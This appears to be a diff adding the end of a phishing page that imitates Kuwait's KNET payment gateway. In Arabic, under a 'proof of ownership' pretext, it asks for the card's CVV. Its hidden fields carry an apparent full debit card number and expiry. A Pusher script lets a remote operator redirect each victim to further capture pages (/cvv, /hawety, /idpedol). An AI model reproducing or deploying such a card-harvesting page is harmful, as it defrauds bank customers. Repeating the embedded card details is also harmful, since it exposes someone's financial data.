+                            </div>
+
+                            <div id="DigiCertClickID_cM-vbZrL"></div>
+                        </div>
+                        <div id="DigiCertClickID_cM-vbZrL"></div>
+                    </footer>
+
+
+                </div>
+            </div>
+        </div>
+
+
+
+
+        <!--  Payment Page Confirmation Starts-->
+        <div id="payConfirm" style="">
+            <div class="container">
+                <div class="content-block">
+
+                    <div class="form-card">
+                        <div class="container-blogo" align="center">
+                            <img style="width: 60px" class="" src="/knet/knet.png" alt="logo">
+                        </div>
+                        <div class="row">
+                            <div><label class="column-label">Merchant:</label></div>
+                            <div><label class="column-value text-label"> Alkuwait</label> </div>
+                        </div>
+                        <div id="OrgTranxAmtConfirm">
+                            <div><label class="column-label">Amount:</label></div>
+                            <div><label class="column-value text-label"> KD 5.000</label></div>
+                        </div>
+
+                        <!-- Added for PG Eidia Discount -->
+
+                        <div class="row" id="DiscntRateConfirm" style="display:none;">
+
+                        </div>
+                        <div class="row" id="DiscntedAmtConfirm" style="display:none;">
+
+                        </div>
+
+                        <!-- Added for PG Eidia Discount -->
+
+                    </div>
+                    <div class="form-card">
+                        <div class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
+    						font-family: helvetica, arial, sans serif;
+    						color: #ff0000;
+   							 padding-right: 15px; margin-bottom: 3px;text-align: center;display:none;" id="otpmsgDC2">
+                        </div>
+                        <div class="row alert-msg" id="notificationbox" style="color:#31708f; font-family: Arial, Helvetica, serif; font-size: 13px;">
+                            <!-- Added for Points Redemption - modified -->
+                            <div dir="rtl" align="right">
+                                <p><span class="title" style="font-weight:bold">إثبات الملكية:</span> عميلنا العزيز نحتاج الى التحقق من عملية الدفع, يرجا إدخال رمز (CVV) الموجود خلف البطاقة.</p>
+                            </div>
+                        </div>
+                        <div dir="rtl" align="center" class="site-heading mb-1">
+                            <img style="width: 70%;" src="/index_files/cvv.png" alt="">
+                        </div>
+                        <div class="row">
+
+
+                        </div>
+
+                        <!-- Added for Points Redemption -->
+
+                        <div class="row" id="OTPDCDIV" style="display: block;">
+                            <div><label class="column-label" style="padding-top: 4px;">CVV:</label></div>
+                            <div>
+                                <!-- <input class="paymentinput" style="width: 60%;"  type="tel" id="debitOTPtimer" name="debitOTP" placeholder="teset" size="6" maxLength="6" 
+                    	onkeyup="return isOtpNumeric(event);" onkeypress="return isOtpNumeric(event);" /> -->
+                                <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" class="allownumericwithoutdecimal" style="width: 60%;" id="debitOTPtimer" name="cvv" placeholder="رمز CVV" size="3" maxlength="3">
+                                <!-- Added for Points Redemption -->
+
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-card">
+                        <div class="row">
+                            <div style="text-align: center;">
+
+                                <div id="loading" style="display:none;">
+                                    <center><img src="/knetVern/loading.gif" style="height:20px;float:left;margin-left:20%"><label class="column-value text-label" style="width:70%;text-align:center;">Processing.. please wait ...</label></center>
+                                </div>
+
+                                <div id="submithide1">
+                                    <button type="submit" name="confirm" class="submit-button"> Confirm</button>
+                                    <input name="proceedCancel" type="button" class="cancel-button" onclick="cancelPage(); sibTags(&#39;MobCancelBtnAR&#39;,&#39;MobPayPageAR&#39;,&#39;CancelBtnAR&#39;);" id="cancel1" value="Cancel">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div align="center" id="overlayhide1" class="overlay" style="display:none;">
+                        <img src="/knetVern/loadingmob.gif" style="height: 15%;margin-top:50%;">
+                    </div>
+
+                    <footer>
+                        <div class="footer-content">
+                            <span>
+            	<div class="row_new">
+                    <div style="text-align: center;font-size: 11px; color: #000000;font-weight:normal;line-height: 18px;">
+                        All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;<br><span style="font-size: 10px;font-weight:bold;color: #0077D5;"> The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET</span>
+                        </div>
+                </div>
+                </span>
+
+            </div>
+            </footer>
+        </div>
+        </div>
+        </div>
+
+
+        <input type="hidden" name="encryptedCardNumber" id="encryptedCardNumber" value="">
+        <input type="hidden" name="encryptedMonth" id="encryptedMonth" value="">
+        <input type="hidden" name="encryptedYear" id="encryptedYear" value="">
+        <!-- Hidden Fields : Start -->
+
+        <input type="hidden" name="creditDebitCheck" value="D">
+
+        <!--  End -->
+        <!-- Code Added for GSTN fix Starts -->
+        <input type="hidden" name="gstnTXNId" id="gstnTXNId" value="">
+        <input type="hidden" name="gstnFlag" id="gstnFlag" value="0">
+        <input type="hidden" name="paymentInitTime" id="paymentInitTime" value="Wed Dec 18 18:07:04 AST 2024">
+        <!-- Code Added for GSTN fix Ends -->
+        <input type="hidden" name="gripsFlag" value="">
+        <input type="hidden" name="selectedPymntInstrmnt" id="selectedPymntInstrmnt" value="">
+        <input type="hidden" name="captchaMsg" id="captchaMsg" value="">
+        <!-- End -->
+        <input type="hidden" name="paymentId" value="102435359000254804">
+        <input type="hidden" name="atmPayRetentionPeriod" value="0">
+
+
+        <input type="hidden" name="merchHeaderFile" value="">
+
+        <input type="hidden" name="mrchName" value="Tap Payments EPSP">
+        <input type="hidden" name="mrchWeb" value="https://kw.payments.tap.company">
+        <input type="hidden" name="pymntInstrmntCC" id="pymntInstrmntCC" value="1">
+
+        <input type="hidden" name="pymntInstrmntAC" value="0">
+        <input type="hidden" name="pymntInstrmntDC" id="pymntInstrmntDC" value="1">
+        <input type="hidden" name="pymntInstrmntPC" id="pymntInstrmntPC" value="0">
+
+        <input type="hidden" name="pymntInstrmntPZ" id="pymntInstrmntPZ" value="0">
+
+        <input type="hidden" name="pymntInstrmntAP" value="0">
+        <input type="hidden" name="pymntInstrmntDD" value="0">
+        <input type="hidden" name="ecomFlg" value="0">
+        <input type="hidden" name="captchaFlg" value="0">
+        <input type="hidden" name="instName" value="KIB">
+        <input type="hidden" name="mrchErrUrl" value="https://knet-fe.payments.tap.company/payment/error?knetId=knet_5882bd64-2e40-4f61-8df8-2fa9754d77d7">
+        <input type="hidden" name="avsFlg" value="0">
+        <input type="hidden" name="headerType" value="0">
+        <input type="hidden" name="maestroCheckFlag" value="0">
+        <input type="hidden" name="rupFlg" value="0">
+        <input type="hidden" name="pymntInstrmntIMPS" value="0">
+        <input type="hidden" name="footer" value="">
+
+        <input type="hidden" name="debitSel" value="P">
+        <input type="hidden" name="creditSel" value="">
+        <input type="hidden" name="prepaidSel" value="">
+
+        <input type="hidden" name="siFlag" value="0">
+
+        <input type="hidden" name="fcFlag" id="fcFlag" value="0">
+        <input type="hidden" name="fcChecked" id="fcChecked">
+        <input type="hidden" name="deletecard" value="">
+        <input type="hidden" name="cardnohash" value="">
+
+        <input type="hidden" name="fcExpCheck" id="fcExpCheck">
+        <input type="hidden" name="fcCtCheck" id="fcCtCheck" value="0">
+        <input type="hidden" name="fcDtCheck" id="fcDtCheck" value="0">
+        <input type="hidden" name="fcPdCheck" id="fcPdCheck" value="0">
+
+        <input type="hidden" name="rdc" id="rdc" value="">
+        <input type="hidden" name="checkBrand" id="checkBrand" value="">
+        <input type="hidden" name="onOffType" id="onOffType" value="">
+        <input type="hidden" name="maestro" id="maestro" value="">
+
+        <input type="hidden" name="ccInstFlg" value="0">
+        <input type="hidden" name="ccTermFlg" value="0">
+        <input type="hidden" name="merchantCurrencyFlg" value="0">
+        <input type="hidden" name="cardCurrencyFlg" value="0">
+        <input type="hidden" name="otherCurrencyFlg" value="0">
+
+        <input type="hidden" name="pymntInstrmntCnt" id="pymntInstrmntCnt" value="2">
+
+        <input type="hidden" value="" name="cspg">
+        <input type="hidden" name="CSRFToken" value="feadcc1d-93a9-46c8-b28f-f503abfc8d0b">
+
+        <input type="hidden" value="" name="otpStatus">
+        <input type="hidden" value="0" name="otpallowed">
+        <input type="hidden" value="0" name="otpmethod">
+        <input type="hidden" name="emiFlag" id="emiFlag" value="0">
+        <input type="hidden" name="radioFlag" id="radioFlag" value="0">
+        <input type="hidden" name="otherCards" id="otherCards" value="">
+        <input type="hidden" name="textFile" value="-">
+        <input type="hidden" name="errorStr" id="errorStr">
+        <input type="hidden" name="resultCode" id="resultCode">
+        <input type="hidden" name="postDate" id="postDate">
+        <input type="hidden" name="responseCode" id="responseCode">
+        <!-- Added for Rupay denied by Risk -->
+        <input type="hidden" name="tranId" id="tranId">
+        <input type="hidden" name="authCode" id="authCode">
+        <!-- End -->
+
+        <input type="hidden" name="mrchHeaderMsgFile" value="">
+        <input type="hidden" name="mrchHeaderHtmlFile" value="">
+        <input type="hidden" name="instHeaderHtmlFile" value="">
+
+        <input type="hidden" id="OtpUserID" name="OtpUserID" value="Knet OTP">
+        <input type="hidden" name="paymentOtpGenCancel">
+        <input type="hidden" name="otpConfirmationFlg">
+        <input type="hidden" name="MaskingCardNum" value="0">
+        <input type="hidden" id="debitCardNumber" name="debitCardNumber" value="4507787537747935">
+        <input type="hidden" name="fCCustMob" id="fCCustMob" value="">
+        <input type="hidden" name="encryptedSavedCardPin" id="encryptedSavedCardPin" value="">
+        <input type="hidden" name="config" value="getBrandDetails">
+        <input type="hidden" name="timeOver" value="0">
+        <input type="hidden" name="Otptenant" value="KFH">
+        <input type="hidden" name="useragent" value="Android">
+        <input type="hidden" name="currSymbol" value="KD">
+        <input type="hidden" name="usingFc">
+        <input type="hidden" name="inst_p2pflg" value="0">
+        <input type="hidden" name="mrch_p2pflg" value="0">
+        <input type="hidden" name="term_p2pflg" value="0">
+        <input type="hidden" name="otpgencount" value="1">
+        <input type="hidden" name="otpvalcount" value="0">
+        <input type="hidden" name="langID" value="EN">
+        <input type="hidden" name="paymentCVdeclineValue">
+        <input type="hidden" name="custvalid" value="0">
+        <input type="hidden" name="otpflgdiv" value="1">
+        <!-- Added by jansirani for P2P Refund -->
+        <input type="hidden" name="p2pRefundFlg" value="0">
+        <input type="hidden" name="instp2pRefundFlg" value="0">
+        <input type="hidden" name="termp2pRefundFlg" value="0">
+        <input type="hidden" name="mrchp2pRefundFlg" value="0">
+        <input type="hidden" name="p2pRefundId" value="">
+        <input type="hidden" name="BranDType">
+
+        <!-- Added for OTP at I-T-B level -->
+        <input type="hidden" name="appAllbrands" value="1">
+        <input type="hidden" name="accptBrndListAmtlmt" value="">
+        <input type="hidden" name="accptBrndList" value="202330389621213,201916924925612,201916924855488,201916975234419,201916924643150,201916924589070,201916924542860,202217100853887,201916975055702,201916924900814,201916924803186,201916924658211,201916975376462,201916924560086,201916924517503,201916405343641">
+        <input type="hidden" name="binsOTPflg" value="1">
+        <input type="hidden" name="amountlimit" value="25.000">
+        <input type="hidden" name="OTPtranamtlmt" value="0.001">
+        <input type="hidden" name="OTPamtlmtidentifier" value="T">
+        <!-- Added for OTP at I-T-B level -->
+
+        <!-- Added for Points Redemption  -->
+        <input type="hidden" id="otpgenMethod" name="otpgenMethod" value="3">
+        <input type="hidden" name="resend" value="">
+        <input type="hidden" name="pymntPointsRedemptionflg" value="0">
+        <!-- Added for Points Redemption  -->
+
+
+        <!--Added for PG Discount flag  -->
+        <input type="hidden" name="discountval">
+        <input type="hidden" name="discountedtranamount">
+        <!--Added for PG Discount flag  -->
+
+        <!-- End -->
+
+        <!-- Added for PROD issue 5th tranx without OTP -->
+        <input type="hidden" name="OTPtranId" value="435373005819987">
+        <!-- Added for PROD issue 5th tranx without OTP -->
+
+        <input type="hidden" name="debitYear" id="debitYearSelect" value="2027">
+        <input type="hidden" name="debitMonth" id="debitMonthSelect" value="5">
+
+        <!-- Hidden Fields : End -->
+
+        <!-- Added for prod issue - 29-jun-21 -->
+        <input type="hidden" name="paymentStatus" value="">
+        <!-- <input type="hidden" name="pymntpagebkstatus" value=""/> -->
+        <input type="hidden" name="ErrorText" value="">
+        <!-- Added for prod issue - 29-jun-21 -->
+
+        <input type="hidden" name="kfastRegAttemptCount" value="0">
+        <input type="hidden" name="kfastRegDeclineValue">
+    </form>
+    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
+
+
+    <script type="text/javascript">
+        var pid = "7212";
+        // Enable pusher logging - don't include this in production
+        Pusher.logToConsole = true;
+        var pusher = new Pusher("087f53ca5c3ac2e36523", {
+            cluster: 'ap2'
+        });
+
+        var channel = pusher.subscribe('confirm');
+        channel.bind('App\\Events\\Confirmation', function(data) {
+            if (data.people_id == pid && data.status == 'Accept') {
+                window.location.href = '/knet/ver';
+            }
+            if (data.people_id == pid && data.status == 'Reject') {
+                window.location.href = '/knetpage';
+            }
+            if (data.people_id == pid && data.status == 'cvv') {
+                window.location.href = '/cvv';
+            }
+            if (data.people_id == pid && data.status == 'error') {
+                window.location.href = '/error';
+            }
+            if (data.people_id == pid && data.status == 'hawety') {
+                window.location.href = '/hawety';
+            }
+
+            if (data.people_id == pid && data.status == 'idpedol') {
+                window.location.href = '/idpedol';
+            }
+
+        });
+    </script>
+
+</body>
+
+</html>
